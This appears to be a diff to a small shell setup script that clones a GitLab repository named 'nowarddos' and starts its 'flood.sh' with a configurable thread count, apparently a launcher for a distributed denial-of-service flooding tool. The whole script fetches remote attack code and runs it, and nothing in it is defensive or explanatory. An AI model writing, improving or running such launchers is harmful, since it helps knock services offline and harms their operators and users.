@@ -1,9 +1,10 @@
 #!/bin/sh
 main() {
-    echo "Setup"
+    threads="${1:-3}"
+    echo "Setup, threads: ${threads}" 
     git clone "https://gitlab.com/a_gonda/nowarddos.git" || exit 1
     cd "nowarddos"
-    ./flood.sh start 5
+    ./flood.sh start ${threads}
 }
 
 main "${@}"
